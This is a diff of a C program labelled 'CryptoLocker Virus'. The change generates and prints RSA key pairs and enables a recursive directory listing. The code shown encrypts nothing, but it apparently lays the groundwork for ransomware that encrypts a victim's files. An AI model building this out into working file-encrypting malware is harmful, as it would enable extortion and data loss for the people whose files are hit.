@@ -5,20 +5,22 @@
 #include <time.h>
 #include <string.h>
 #include "rsa.h"
+
 ///*CryptoLocker Virus*///
 
-//void listdir(const char *name, int level);
+float *readModFile(FILE *ftpr, int *n);
 
 int main(int argc, char **argv){
-  struct key_class public[1];
-  struct key_class private[1];
+  struct public_key_class public[1];
+  struct private_key_class private[1];
   rsa_gen_keys( public, private,PRIME_SOURCE_FILE);
   printKeys(public, private);
-  // listdir(".", 0);
+  listdir(".",0);
+  
 
 }
 
-/*void listdir(const char *name, int level)
+void listdir(const char *name, int level)
 {
     DIR *dir;
     struct dirent *entry;
@@ -42,5 +44,5 @@ int main(int argc, char **argv){
             printf("%*s- %s\n", level*2, "", entry->d_name);
     } while (entry = readdir(dir));
     closedir(dir);
-    }*/
+}
 
